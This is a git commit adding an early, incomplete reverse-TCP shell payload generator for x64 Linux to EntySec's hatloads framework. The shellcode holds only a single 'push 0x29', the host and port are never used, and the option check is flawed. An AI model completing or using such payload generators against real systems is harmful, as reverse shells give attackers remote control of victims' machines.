d9501295320fd5a5be5fb584ce7a392e7d8b0dc5
Ivan Nikolsky <enty8080@gmail.com>
2022-01-21 02:09:20 +0300

    Create shell_reverse_tcp.py

---
+++ hatloads/payloads/linux/x64/shell_reverse_tcp.py
@@ -0,0 +1,45 @@
+#!/usr/bin/env python3
+
+#
+# MIT License
+#
+# Copyright (c) 2020-2022 EntySec
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+#
+
+from hatvenom import HatVenom
+
+
+class ShellReverseTCP(HatVenom):
+    def generate(self, assemble=True, options={}):
+        if 'RHOST' not in options and 'RPORT' not in options:
+            return b''
+
+        rhost = self.convert_host(options['RHOST'])
+        rport = self.convert_port(options['RPORT'])
+
+        shellcode = f"""
+        start:
+            push 0x29
+        """
+
+        if assemble:
+            return self.assemble('x64', shellcode)
+        return shellcode
